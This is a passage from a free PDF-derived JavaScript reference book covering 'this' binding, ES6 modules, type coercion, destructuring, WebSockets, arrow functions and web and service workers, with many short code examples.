JavaScript
Notes for ProfessionalsJavaScript®
Notes for Professionals
GoalKicker.com
Free Programming BooksDisclaimer
This is an unocial free book created for educational purposes and is
not aliated with ocial JavaScript ® group(s) or company(s).
All trademarks and registered trademarks are
the property of their respective owners
400+ pages
of professional hints and tricks
Contents
About  1  ................................................................................................................................................................................... 
functions has lexical scope rather than the usual dynamic scope). In global code (code that doesn't belong to any
function) it would be the global object. And it keeps that way, even if you invoke the function declared with the
arrow notation from any of the others methods here described.
var globalThis = this; //"window" in a browser, or "global" in Node.js
var foo = (() => this);          
console. log(foo() === globalThis );          //true
var obj = { name: "Foo" };
console. log(foo.call(obj) === globalThis );  //true
See how this  inherits the context rather than referring to the object the method was called on.
var globalThis = this;
GoalKicker.com – JavaScript ® Notes for Professionals 319var obj = {
    withoutArrow : function () {
        return this;
    },
    withArrow : () => this
};
console. log(obj.withoutArrow () === obj);      //true
console. log(obj.withArrow () === globalThis );  //true
var fn = obj.withoutArrow ; //no longer calling withoutArrow as a method
var fn2 = obj.withArrow ;
console. log(fn() === globalThis );             //true
console. log(fn2() === globalThis );            //true
Section 56.6: Bound invocation
The bind  method of every function allows you to create new version of that function with the context strictly bound
to a speciﬁc object. It is especially useful to force a function to be called as a method of an object.
var obj = { foo: 'bar' };
function  foo() {
    return this.foo;
}
fooObj = foo.bind(obj);
fooObj();
This will log:
bar
Section 56.7: Method invocation
Invoking a function as a method of an object the value of this  will be that object.
var obj = {
    name : "Foo",
    print : function  () {
        console. log(this.name)
    }
}
We can now invoke print as a method of obj. this  will be obj
obj.print();
This will thus log:
Foo
GoalKicker.com – JavaScript ® Notes for Professionals 320Section 56.8: Anonymous invocation
Invoking a function as an anonymous function, this  will be the global object ( self  in the browser).
function  func() {
    return this;
}
func() === window; // true
Version = 5
In ECMAScript 5's strict mode, this  will be undefined  if the function is invoked anonymously.
(function  () {
    "use strict" ;
    func ();
}())
This will output
undefined
Section 56.9: Constructor invocation
When a function is invoked as a constructor with the new keyword this  takes the value of the object being
constructed
function  Obj(name) {
    this.name = name;
}
var obj = new Obj("Foo");
console. log(obj);
This will log
{ name: "Foo" }
Section 56.10: Using let in loops instead of var (click handlers
example)
Let's say we need to add a button for each piece of loadedData  array (for instance, each button should be a slider
showing the data; for the sake of simplicity, we'll just alert a message). One may try something like this:
for(var i = 0; i < loadedData. length; i++)
    jQuery ("#container" ).append("<a class='button'>" +loadedData [i].label+"</a>")
        . children ().last() // now let's attach a handler to the button which is a child
        . on("click",function () { alert(loadedData [i].content); });
But instead of alerting, each button will cause the
GoalKicker.com – JavaScript ® Notes for Professionals 321TypeError: loadedData[i] is undeﬁned
error. This is because the scope of i is the global scope (or a function scope) and after the loop, i == 3. What we
need is not to "remember the state of i". This can be done using let:
for(let i = 0; i < loadedData. length; i++)
    jQuery ("#container" ).append("<a class='button'>" +loadedData [i].label+"</a>")
        . children ().last() // now let's attach a handler to the button which is a child
        . on("click",function () { alert(loadedData [i].content); });
An example of loadedData  to be tested with this code:
    var loadedData = [
        { label:"apple",      content :"green and round"  },
        { label:"blackberry" , content :"small black or blue"  },
        { label:"pineapple" ,  content :"weird stuff.. difficult to explain the shape"  }
    ];
A ﬁddle to illustrate this
GoalKicker.com – JavaScript ® Notes for Professionals 322Chapter 57: Modules
Section 57.1: Deﬁning a module
In ECMAScript 6, when using the module syntax ( import /export ), each ﬁle becomes its own module with a private
namespace. Top-level functions and variables do not pollute the global namespace. To expose functions, classes,
and variables for other modules to import, you can use the export  keyword.
// not exported
function  somethingPrivate () {
    console. log('TOP SECRET' )
}
export const PI = 3.14;
export function  doSomething () {
    console. log('Hello from a module!' )
}
function  doSomethingElse (){
    console. log("Something else" )
}
export {doSomethingElse }
export class MyClass {
    test () {}
}
Note: ES5 JavaScript ﬁles loaded via <script> tags will remain the same when not using import /export .
Only the values which are explicitly exported will be available outside of the module. Everything else can be
considered private or inaccessible.
Importing this module would yield (assuming the previous code block is in my-module.js):
import * as myModule from './my-module.js' ;
myModule. PI;                 // 3.14
myModule. doSomething ();      // 'Hello from a module!'
myModule. doSomethingElse ();  // 'Something else'
new myModule. MyClass();      // an instance of MyClass
myModule. somethingPrivate (); // This would fail since somethingPrivate was not exported
Section 57.2: Default exports
In addition to named imports, you can provide a default export.
// circle.js
export const PI = 3.14;
export default function  area(radius) {
    return PI * radius * radius;
}
You can use a simpliﬁed syntax to import the default export.
GoalKicker.com – JavaScript ® Notes for Professionals 323import circleArea from './circle' ;
console. log(circleArea (4));
Note that a default export  is implicitly equivalent to a named export with the name default , and the imported
binding ( circleArea  above) is simply an alias. The previous module can be written like
import { default as circleArea } from './circle' ;
console. log(circleArea (4));
You can only have one default export per module. The name of the default export can be omitted.
// named export: must have a name
export const PI = 3.14;
// default export: name is not required
export default function  (radius) {  
    return PI * radius * radius;
}
Section 57.3: Importing named members from another
module
Given that the module from the Deﬁning a Module section exists in the ﬁle test.js, you can import from that
module and use its exported members:
import {doSomething , MyClass , PI} from './test'
doSomething ()
const mine = new MyClass ()
mine.test()
console. log(PI)
The somethingPrivate () method was not exported from the test  module, so attempting to import it will fail:
import {somethingPrivate } from './test'
somethingPrivate ()
Section 57.4: Importing an entire module
In addition to importing named members from a module or a module's default export, you can also import all
members into a namespace binding.
import * as test from './test'
test.doSomething ()
All exported members are now available on the test  variable. Non-exported members are not available, just as
they are not available with named member imports.
Note:  The path to the module './test'  is resolved by the loader  and is not covered by the ECMAScript speciﬁcation
- this could be a string to any resource (a path - relative or absolute - on a ﬁlesystem, a URL to a network resource,
or any other string identiﬁer).
GoalKicker.com – JavaScript ® Notes for Professionals 324Section 57.5: Importing named members with aliases
Sometimes you may encounter members that have really long member names, such as
thisIsWayTooLongOfAName (). In this case, you can import the member and give it a shorter name to use in your
current module:
import {thisIsWayTooLongOfAName as shortName } from 'module'
shortName ()
You can import multiple long member names like this:
import {thisIsWayTooLongOfAName as shortName , thisIsAnotherLongNameThatShouldNotBeUsed as
otherName } from 'module'
shortName ()
console. log(otherName )
And ﬁnally, you can mix import aliases with the normal member import:
import {thisIsWayTooLongOfAName as shortName , PI} from 'module'
shortName ()
console. log(PI)
Section 57.6: Importing with side eects
Sometimes you have a module that you only want to import so its top-level code gets run. This is useful for polyﬁlls,
other globals, or conﬁguration that only runs once when your module is imported.
Given a ﬁle named test.js:
console. log('Initializing...' )
You can use it like this:
import './test'
This example will print Initializing...  to the console.
Section 57.7: Exporting multiple named members
const namedMember1 = ...
const namedMember2 = ...
const namedMember3 = ...
export { namedMember1 , namedMember2 , namedMember3 }
GoalKicker.com – JavaScript ® Notes for Professionals 325Chapter 58: Screen
Section 58.1: Getting the screen resolution
To get the physical size of the screen (including window chrome and menubar/launcher):
var width  = window. screen.width,
    height = window. screen.height;
Section 58.2: Getting the “available” area of the screen
To get the “available ” area of the screen (i.e. not including any bars on the edges of the screen, but including
window chrome and other windows:
var availableArea = {
    pos: {
        x : window. screen.availLeft ,
        y : window. screen.availTop
    },
    size : {
        width : window. screen.availWidth ,
        height : window. screen.availHeight
    }
};
Section 58.3: Page width and height
To get current page width and height (for any browser), e.g. when programming responsiveness:
function  pageWidth () {
  return window. innerWidth  != null? window. innerWidth  : document. documentElement  &&
document. documentElement .clientWidth  ? document. documentElement .clientWidth  : document. body != null
? document. body.clientWidth  : null;
}
function  pageHeight () {
  return  window. innerHeight  != null? window. innerHeight  : document. documentElement  &&
document. documentElement .clientHeight  ? document. documentElement .clientHeight  : document. body !=
null? document. body.clientHeight  : null;
}
Section 58.4: Window innerWidth and innerHeight Properties
Get the window height and width
var width = window. innerWidth
var height = window. innerHeight
Section 58.5: Getting color information about the screen
To determine the color and pixel depths of the screen:
var pixelDepth = window. screen.pixelDepth ,
    colorDepth = window. screen.colorDepth ;
GoalKicker.com – JavaScript ® Notes for Professionals 326Chapter 59: Variable coercion/conversion
Section 59.1: Double Negation (!!x)
The double-negation !! is not a distinct JavaScript operator nor a special syntax but rather just a sequence of two
negations. It is used to convert the value of any type to its appropriate true  or false  Boolean value depending on
whether it is truthy  or falsy .
!!1            // true
!!0            // false
!!undefined     // false
!!{}           // true
!![]           // true
The ﬁrst negation converts any value to false  if it is truthy  and to true  if is falsy . The second negation then operates
on a normal Boolean value. Together they convert any truthy  value to true  and any falsy  value to false .
However, many professionals consider the practice of using such syntax unacceptable and recommend simpler to
read alternatives, even if they're longer to write:
x !== 0        // instead of !!x in case x is a number
x != null      // instead of !!x in case x is an object, a string, or an undefined
Usage of !!x is considered poor practice due to the following reasons:
Stylistically it may look like a distinct special syntax whereas in fact it is not doing anything other than two1.
consecutive negations with implicit type conversion.
It is better to provide information about types of values stored in variables and properties through the code.2.
For example, x !== 0 says that x is probably a number, whereas !!x does not convey any such advantage to
readers of the code.
Usage of Boolean(x) allows for similar functionality, and is a more explicit conversion of type. 3.
Section 59.2: Implicit conversion
JavaScript will try to automatically convert variables to more appropriate types upon use. It's usually advised to do
conversions explicitly (see other examples), but it's still worth knowing what conversions take place implicitly.
"1" + 5 === "15" // 5 got converted to string.
1 + "5" === "15" // 1 got converted to string.
1 - "5" === -4 // "5" got converted to a number.
alert({}) // alerts "[object Object]", {} got converted to string.
!0 === true // 0 got converted to boolean
if ("hello") {} // runs, "hello" got converted to boolean.
new Array(3) === ",,"; // Return true. The array is converted to string - Array.toString();
Some of the trickier parts:
!"0" === false // "0" got converted to true, then reversed.
!"false" === false // "false" converted to true, then reversed.
Section 59.3: Converting to boolean
Boolean(...) will convert any data type into either true  or false .
GoalKicker.com – JavaScript ® Notes for Professionals 327Boolean("true") === true
Boolean("false") === true
Boolean(-1) === true
Boolean(1) === true
Boolean(0) === false
Boolean("") === false
Boolean("1") === true
Boolean("0") === true
Boolean({}) === true
Boolean([]) === true
Empty strings and the number 0 will be converted to false, and all others will be converted to true.
A shorter, but less clear, form:
!!"true" === true
!!"false" === true
!!-1 === true
!!1 === true
!!0 === false
!!"" === false
!!"1" === true
!!"0" === true
!!{} === true
!![] === true
This shorter form takes advantage of implicit type conversion using the logical NOT operator twice, as described in
http://stackoverﬂow.com/documentation/javascript/208/boolean-logic/3047/double-negation-x
Here is the complete list of boolean conversions from the ECMAScript speciﬁcation
if myArg  of type undefined  or null  then Boolean(myArg) === false
if myArg  of type boolean  then Boolean(myArg) === myArg
if myArg  of type number  then Boolean(myArg) === false  if myArg  is +0, ‑0, or NaN; otherwise true
if myArg  of type string  then Boolean(myArg) === false  if myArg  is the empty String (its length is zero);
otherwise true
if myArg  of type symbol  or object  then Boolean(myArg) === true
Values that get converted to false  as booleans are called falsy  (and all others are called truthy ). See Comparison
Operations.
Section 59.4: Converting a string to a number
Number('0') === 0
Number('0') will convert the string ( '0') into a number ( 0)
A shorter, but less clear, form:
+'0' === 0
The unary + operator does nothing to numbers, but converts anything else to a number.
Interestingly, +(-12) === -12.
parseInt ('0', 10) === 0
GoalKicker.com – JavaScript ® Notes for Professionals 328parseInt ('0', 10) will convert the string ( '0') into a number ( 0), don't forget the second argument, which is radix.
If not given, parseInt could convert string to wrong number.
Section 59.5: Converting a number to a string
String(0) === '0'
String(0) will convert the number ( 0) into a string ( '0').
A shorter, but less clear, form:
'' + 0 === '0'
Section 59.6: Primitive to Primitive conversion table
Value Converted To String Converted To Number Converted To Boolean
undeﬁnded "undeﬁned" NaN false
null "null" 0 false
true "true" 1
false "false" 0
NaN "NaN" false
"" empty string 0 false
" " 0 true
"2.4" (numeric) 2.4 true
"test" (non numeric NaN true
"0" 0 true
"1" 1 true
-0 "0" false
0 "0" false
1 "1" true
Inﬁnity "Inﬁnity" true
-Inﬁnity "-Inﬁnity" true
[] "" 0 true
[3] "3" 3 true
['a'] "a" NaN true
['a','b'] "a,b" NaN true
{ } "[object Object]" NaN true
function(){} "function(){}" NaN true
Bold values highlight conversion that programmers may ﬁnd surprising
To convert explicitly values you can use String() Number() Boolean()
Section 59.7: Convert an array to a string
Array.join(separator ) can be used to output an array as a string, with a conﬁgurable separator.
Default (separator = ","):
["a", "b", "c"].join() === "a,b,c"
GoalKicker.com – JavaScript ® Notes for Professionals 329With a string separator:
[1, 2, 3, 4].join(" + ") === "1 + 2 + 3 + 4"
With a blank separator:
["B", "o", "b"].join("") === "Bob"
Section 59.8: Array to String using array methods
This way may seem to be useless because you are using anonymous function to accomplish something that you
can do it with join(); But if you need to make something to the strings while you are converting the Array to String,
this can be useful.
var  arr = ['a', 'á', 'b', 'c']
function  upper_lower (a, b, i) {
  //...do something here
  b = i & 1 ? b.toUpperCase () : b.toLowerCase ();
  return a + ',' + b
}
arr = arr.reduce(upper_lower ); // "a, Á,b,C"
Section 59.9: Converting a number to a boolean
Boolean(0) === false
Boolean(0) will convert the number 0 into a boolean false .
A shorter, but less clear, form:
!!0 === false
Section 59.10: Converting a string to a boolean
To convert a string to boolean use
Boolean(myString )
or the shorter but less clear form
!!myString
All strings except the empty string (of length zero) are evaluated to true  as booleans.
Boolean('') === false   // is true
Boolean("") === false   // is true
Boolean('0') === false  // is false
Boolean('any_nonempty_string' ) === true // is true
Section 59.11: Integer to Float
In JavaScript, all numbers are internally represented as ﬂoats. This means that simply using your integer as a ﬂoat is
GoalKicker.com – JavaScript ® Notes for Professionals 330all that must be done to convert it.
Section 59.12: Float to Integer
To convert a ﬂoat to an integer, JavaScript provides multiple methods.
The floor  function returns the ﬁrst integer less than or equal to the ﬂoat.
Math.floor(5.7); // 5
The ceil  function returns the ﬁrst integer greater than or equal to the ﬂoat.
Math.ceil(5.3); // 6
The round  function rounds the ﬂoat.
Math.round(3.2); // 3
Math.round(3.6); // 4
Version ≥ 6
Truncation ( trunc ) removes the decimals from the ﬂoat.
Math.trunc(3.7); // 3
Notice the diﬀerence between truncation ( trunc ) and floor :
Math.floor(-3.1); // -4
Math.trunc(-3.1); // -3
Section 59.13: Convert string to ﬂoat
parseFloat  accepts a string as an argument which it converts to a ﬂoat/
parseFloat ("10.01") // = 10.01
GoalKicker.com – JavaScript ® Notes for Professionals 331Chapter 60: Destructuring assignment
Destructuring is a pattern matching  technique that is added to JavaScript recently in ECMAScript 6.
It allows you to bind a group of variables to a corresponding set of values when their pattern matches to the right
hand-side and the left hand-side of the expression.
Section 60.1: Destructuring Objects
Destructuring is a convenient way to extract properties from objects into variables.
Basic syntax:
let person = {
  name: 'Bob',
  age: 25
};
let { name, age } = person;
// Is equivalent to
let name = person. name; // 'Bob'
let age = person. age;   // 25
Destructuring and renaming:
let person = {
  name: 'Bob',
  age: 25
};
let { name: firstName } = person;
// Is equivalent to
let firstName = person. name; // 'Bob'
Destructuring with default values:
let person = {
  name: 'Bob',
  age: 25
};
let { phone = '123-456-789'  } = person;
// Is equivalent to
let phone = person. hasOwnProperty ('phone') ? person. phone : '123-456-789' ; // '123-456-789'
Destructuring and renaming with default values
let person = {
  name: 'Bob',
  age: 25
};
let { phone: p = '123-456-789'  } = person;
GoalKicker.com – JavaScript ® Notes for Professionals 332// Is equivalent to
let p = person. hasOwnProperty ('phone') ? person. phone : '123-456-789' ; // '123-456-789'
Section 60.2: Destructuring function arguments
Pull properties from an object passed into a function. This pattern simulates named parameters instead of relying
on argument position.
let user = {
    name : 'Jill',
    age: 33,
    profession : 'Pilot'
}    
function  greeting ({name, profession }) {
    console. log(`Hello, ${name} the ${profession }`)
}
greeting (user)
This also works for arrays:
let parts = ["Hello", "World!" ];
function  greeting ([first, second]) {
    console. log(`${first} ${second}`);
}
Section 60.3: Nested Destructuring
We are not limited to destructuring an object/array, we can destructure a nested object/array.
Nested Object Destructuring
var obj = {
  a: {
    c: 1,
    d: 3
  },
  b: 2
};
var {
  a: {
    c: x,
    d: y
  },
  b: z
} = obj;
console. log(x, y, z);     // 1,3,2
Nested Array Destructuring
var arr = [1, 2, [3, 4], 5];
var [a, , [b, c], d] = arr;
GoalKicker.com – JavaScript ® Notes for Professionals 333console. log(a, b, c, d);      // 1 3 4 5
Destructuring is not just limited to a single pattern, we can have arrays in it, with n-levels of nesting. Similarly we
can destructure arrays with objects and vice-versa.
Arrays Within Object
var obj = {
  a: 1,
  b: [2, 3]
};
var {
  a: x1,
  b: [x2, x3]
} = obj;
console. log(x1, x2, x3);    // 1 2 3
Objects Within Arrays
var arr = [1, 2 , {a : 3}, 4];
var [x1, x2 , {a : x3}, x4] = arr;
console. log(x1, x2, x3, x4);
Section 60.4: Destructuring Arrays
const myArr = ['one', 'two', 'three']
const [ a, b, c ] = myArr
// a = 'one', b = 'two, c = 'three'
We can set default value in destructuring array, see the example of Default Value While Destructuring.
With destructuring array, we can swap the values of 2 variables easily:
var a = 1;
var b = 3;
[a, b] = [b, a];
// a = 3, b = 1
We can specify empty slots to skip unneeded values:
[a, , b] = [1, 2, 3] // a = 1, b = 3
Section 60.5: Destructuring inside variables
Aside from destructuring objects into function arguments, you can use them inside variable declarations as follows:
const person = {
  name: 'John Doe' ,
  age: 45,
  location : 'Paris, France' ,
};
GoalKicker.com – JavaScript ® Notes for Professionals 334let { name, age, location } = person;
console. log('I am ' + name + ', aged '  + age + ' and living in '  + location + '.');
// -> "I am John Doe aged 45 and living in Paris, France."
As you can see, three new variables were created: name , age and location  and their values were grabbed from the
object person  if they matched key names.
Section 60.6: Default Value While Destructuring
We often encounter a situation where a property we're trying to extract doesn't exist in the object/array, resulting
in a TypeError  (while destructuring nested objects) or being set to undefined . While destructuring we can set a
default value, which it will fallback to, in case of it not being found in the object.
var obj = {a : 1};
var {a : x , b : x1 = 10} = obj;
console. log(x, x1); // 1, 10
 
var arr = [];
var [a = 5, b = 10, c] = arr;
console. log(a, b, c); // 5, 10, undefined
Section 60.7: Renaming Variables While Destructuring
Destructuring allows us to refer to one key in an object, but declare it as a variable with a diﬀerent name. The
syntax looks like the key-value syntax for a normal JavaScript object.
let user = {
  name: 'John Smith' ,
  id: 10,
  email: 'johns@workcorp.com' ,
};
let {user: userName , id: userId} = user;
console. log(userName ) // John Smith
console. log(userId) // 10
GoalKicker.com – JavaScript ® Notes for Professionals 335Chapter 61: WebSockets
Parameter Details
url The server url supporting this web socket connection.
data The content to send to the host.
message The message received from the host.
WebSocket is protocol, which enables two-way communication between a client and server:
The goal WebSocket is to provide a mechanism for browser-based applications that need two-way communication
with servers that does not rely on opening multiple HTTP connections. ( RFC 6455 )
WebSocket works over HTTP protocol.
Section 61.1: Working with string messages
var wsHost = "ws://my-sites-url.com/path/to/echo-web-socket-handler" ;
var ws = new WebSocket (wsHost);
var value = "an example message" ;
//onmessage : Event Listener - Triggered when we receive message form server
ws.onmessage  = function (message) {
    if (message === value) {
        console. log("The echo host sent the correct message." );
    } else {
        console. log("Expected: "  + value);
        console. log("Received: "  + message );
    }
};
//onopen : Event Listener - event is triggered when websockets readyState changes to open which means
now we are ready to send and receives messages from server
ws.onopen = function () {
    //send is used to send the message to server
    ws.send(value);
};
Section 61.2: Establish a web socket connection
var wsHost = "ws://my-sites-url.com/path/to/web-socket-handler" ;
var ws = new WebSocket (wsHost);
Section 61.3: Working with binary messages
var wsHost = "http://my-sites-url.com/path/to/echo-web-socket-handler" ;
var ws = new WebSocket (wsHost);
var buffer = new ArrayBuffer (5); // 5 byte buffer
var bufferView = new DataView (buffer);
bufferView. setFloat32 (0, Math.PI);
bufferView. setUint8 (4, 127);
ws.binaryType  = 'arraybuffer' ;
ws.onmessage  = function (message) {
    var view = new DataView (message. data);
GoalKicker.com – JavaScript ® Notes for Professionals 336    console. log('Uint8:' , view.getUint8 (4), 'Float32:' , view.getFloat32 (0))
};
ws.onopen = function () {
    ws.send(buffer);
};
Section 61.4: Making a secure web socket connection
var sck = "wss://site.com/wss-handler" ;
var wss = new WebSocket (sck);
This uses the wss instead of ws to make a secure web socket connection which make use of HTTPS instead of HTTP
GoalKicker.com – JavaScript ® Notes for Professionals 337Chapter 62: Arrow Functions
Arrow functions are a concise way of writing anonymous, lexically scoped functions in ECMAScript 2015 (ES6) .
Section 62.1: Introduction
In JavaScript, functions may be anonymously deﬁned using the "arrow" ( =>) syntax, which is sometimes referred to
as a lambda expression  due to Common Lisp similarities.
The simplest form of an arrow function has its arguments on the left side of => and the return value on the right
side:
item => item + 1 // -> function(item){return item + 1}
This function can be immediately invoked by providing an argument to the expression:
(item => item + 1)(41) // -> 42
If an arrow function takes a single parameter, the parentheses around that parameter are optional. For example,
the following expressions assign the same type of function into constant variables:
const foo = bar => bar + 1;
const bar = (baz) => baz + 1;
However, if the arrow function takes no parameters, or more than one parameter, a new set of parentheses must
encase all the arguments:
(() => "foo")() // -> "foo"
((bow, arrow) => bow + arrow)('I took an arrow ' , 'to the knee...' )
// -> "I took an arrow to the knee..."
If the function body doesn't consist of a single expression, it must be surrounded by brackets and use an explicit
return  statement for providing a result:
(bar => {
  const baz = 41;
  return bar + baz;
})(1); // -> 42
If the arrow function's body consists only of an object literal, this object literal has to be enclosed in parentheses:
(bar => ({ baz: 1 }))(); // -> Object {baz: 1}
The extra parentheses indicate that the opening and closing brackets are part of the object literal, i.e. they are not
delimiters of the function body.
Section 62.2: Lexical Scoping & Binding (Value of "this")
Arrow functions are lexically scoped ; this means that their this  Binding is bound to the context of the surrounding
scope. That is to say, whatever this  refers to can be preserved by using an arrow function.
Take a look at the following example. The class Cow has a method that allows for it to print out the sound it makes
GoalKicker.com – JavaScript ® Notes for Professionals 338after 1 second.
class Cow {
  constructor () {
    this.sound = "moo";
  }
  makeSoundLater () {
    setTimeout (() => console. log(this.sound), 1000);
  }
}
const betsy = new Cow();
betsy.makeSoundLater ();
In the makeSoundLater () method, the this  context refers to the current instance of the Cow object, so in the case
where I call betsy.makeSoundLater (), the this  context refers to betsy .
By using the arrow function, I preserve  the this  context so that I can make reference to this.sound  when it comes
time to print it out, which will properly print out "moo".
If you had used a regular function in place of the arrow function, you would lose the context of being within the
class, and not be able to directly access the sound  property.
Section 62.3: Arguments Object
Arrow functions do not expose an arguments object; therefore, arguments  would simply refer to a variable in the
current scope.
const arguments = [true];
const foo = x => console. log(arguments [0]);
foo(false); // -> true
Due to this, arrow functions are also not aware of their caller/callee.
While the lack of an arguments object can be a limitation in some edge cases, rest parameters are generally a
suitable alternative.
const arguments = [true];
const foo = (...arguments ) => console. log(arguments [0]);
foo(false); // -> false
Section 62.4: Implicit Return
Arrow functions may implicitly return values by simply omitting the curly braces that traditionally wrap a function's
body if their body only contains a single expression.
const foo = x => x + 1;
foo(1); // -> 2
When using implicit returns, object literals must be wrapped in parenthesis so that the curly braces are not
mistaken for the opening of the function's body.
GoalKicker.com – JavaScript ® Notes for Professionals 339const foo = () => { bar: 1 } // foo() returns undefined
const foo = () => ({ bar: 1 }) // foo() returns {bar: 1}
Section 62.5: Arrow functions as a constructor
Arrow functions will throw a TypeError  when used with the new keyword.
const foo = function  () {
  return 'foo';
}
const a = new foo();
const bar = () => {
  return 'bar';
}
const b = new bar(); // -> Uncaught TypeError: bar is not a constructor...
Section 62.6: Explicit Return
Arrow functions can behave very similar to classic functions in that you may explicitly return a value from them
using the return  keyword; simply wrap your function's body in curly braces, and return a value:
const foo = x => {
  return x + 1;
}
foo(1); // -> 2
GoalKicker.com – JavaScript ® Notes for Professionals 340Chapter 63: Workers
Section 63.1: Web Worker
A web worker is a simple way to run scripts in background threads as the worker thread can perform tasks
(including I/O tasks using XMLHttpRequest) without interfering with the user interface. Once created, a worker can
send messages which can be diﬀerent data types (except functions) to the JavaScript code that created it by posting
messages to an event handler speciﬁed by that code (and vice versa.)
Workers can be created in a few ways.
The most common is from a simple URL:
var webworker = new Worker("./path/to/webworker.js" );
It's also possible to create a Worker dynamically from a string using URL.createObjectURL ():
var workerData = "function someFunction() {}; console.log('More code');" ;
var blobURL = URL.createObjectURL (new Blob(["(" + workerData + ")"], { type: "text/javascript"  }));
var webworker = new Worker(blobURL);
The same method can be combined with Function .toString () to create a worker from an existing function:
var workerFn = function () {
    console. log("I was run" );
};
var blobURL = URL.createObjectURL (new Blob(["(" + workerFn. toString () + ")"], { type:
"text/javascript"  }));
var webworker = new Worker(blobURL);
Section 63.2: A simple service worker
main.js
A service worker is an event-driven worker registered against an origin and a path. It takes the form of a
JavaScript ﬁle that can control the web page/site it is associated with, intercepting and modifying
navigation and resource requests, and caching resources in a very granular fashion to give you complete
control over how your app behaves in certain situations (the most obvious one being when the network is
not available.)
Source: MDN
Few Things:
It's a JavaScript Worker, so it can't access the DOM directly1.
It's a programmable network proxy2.
It will be terminated when not in use and restarted when it's next needed3.
A service worker has a lifecycle which is completely separate from your web page4.
HTTPS is Needed5.
GoalKicker.com – JavaScript ® Notes for Professionals 341This code that will be executed in the Document context, (or) this JavaScript will be included in your page via a
<script> tag.
// we check if the browser supports ServiceWorkers
if ('serviceWorker'  in navigator ) {
  navigator
    .serviceWorker
    .register (
      // path to the service worker file
      'sw.js'
    )
    // the registration is async and it returns a promise
    .then(function  (reg) {
      console. log('Registration Successful' );
    });
}
sw.js
This is the service worker code and is executed in the ServiceWorker Global Scope .
self.addEventListener ('fetch', function  (event) {
  // do nothing here, just log all the network requests
  console. log(event.request.url);
});
Section 63.3: Register a service worker
// Check if service worker is available.
if ('serviceWorker'  in navigator ) {
  navigator. serviceWorker .register ('/sw.js' ).then(function (registration ) {
    console. log('SW registration succeeded with scope:' , registration. scope);
  }).catch(function (e) {
    console. log('SW registration failed with error:' , e);
  });
}
You can call register () on every page load. If the SW is already registered, the browser provides you with
instance that is already running
The SW ﬁle can be any name. sw.js is common.
The location of the SW ﬁle is important because it deﬁnes the SW's scope. For example, an SW ﬁle at
/js/sw.js can only intercept fetch  requests for ﬁles that begin with /js/. For this reason you usually see the
SW ﬁle at the top-level directory of the project.
Section 63.4: Communicating with a Web Worker
Since workers run in a separate thread from the one that created them, communication needs to happen via
postMessage .
Note:  Because of the diﬀerent export preﬁxes, some browsers have webkitPostMessage  instead of postMessage .
You should override postMessage  to make sure workers "work" (no pun intended) in the most places possible:
worker.postMessage  = (worker.webkitPostMessage  || worker. postMessage );
From the main thread (parent window):
// Create a worker
GoalKicker.com – JavaScript ® Notes for Professionals 342var webworker = new Worker("./path/to/webworker.js" );
// Send information to worker
webworker. postMessage ("Sample message" );
// Listen for messages from the worker
webworker. addEventListener ("message" , function (event) {
    // `event.data` contains the value or object sent from the worker
    console. log("Message from worker:" , event.data); // ["foo", "bar", "baz"]
});
From the worker, in webworker. js:
// Send information to the main thread (parent window)
self.postMessage (["foo", "bar", "baz"]);
// Listen for messages from the main thread
self.addEventListener ("message" , function (event) {
    // `event.data` contains the value or object sent from main
    console. log("Message from parent:" , event.data); // "Sample message"
});
Alternatively, you can also add event listeners using onmessage :
From the main thread (parent window):
webworker. onmessage  = function (event) {
    console. log("Message from worker:" , event.data); // ["foo", "bar", "baz"]
}
From the worker, in webworker. js:
self.onmessage  = function (event) {
    console. log("Message from parent:" , event.data); // "Sample message"
}
Section 63.5: Terminate a worker
Once you are done with a worker you should terminate it. This helps to free up resources for other applications on
the user ’s computer.
Main Thread:
// Terminate a worker from your application.
worker.terminate ();
Note : The terminate  method is not available for service workers. It will be terminated when not in use, and
restarted when it's next needed.
Worker Thread:
// Have a worker terminate itself.
self.close();
GoalKicker.com – JavaScript ® Notes for Professionals 343Section 63.6: Populating your cache
After your service worker is registered, the browser will try to install & later activate the service worker.
Install event listener
this.addEventListener ('install' , function (event) {
    console. log('installed' );
});
Caching
One can use this install event returned to cache the assets needed to run the app oﬄine. Below example uses the
cache api to do the same.
this.addEventListener ('install' , function (event) {
  event. waitUntil (
    caches. open('v1').then(function (cache) {
      return cache.addAll([
        /* Array of all the assets that needs to be cached */
        '/css/style.css' ,
        '/js/app.js' ,
        '/images/snowTroopers.jpg'
      ]);
    })
  );
});
Section 63.7: Dedicated Workers and Shared Workers
Dedicated Workers
A dedicated web worker is only accessible by the script that called it.
Main application:
var worker = new Worker('worker.js' );
